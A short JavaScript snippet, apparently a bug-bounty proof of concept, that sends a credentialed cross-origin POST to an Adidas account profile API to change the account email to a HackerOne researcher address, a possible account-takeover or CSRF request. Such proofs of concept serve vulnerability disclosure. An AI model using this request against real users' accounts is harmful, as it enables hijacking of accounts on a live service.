fetch('https://www.adidas.com/api/account/profile/aic?sitePath=us', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({"profile":{"email":"thebee0x+5@wearehackerone.com"}}),
    credentials: 'include' // Includes cookies automatically
})
.then(response => response.json())
.then(data => console.log('Success:', data))
.catch(error => console.error('Error:', error));
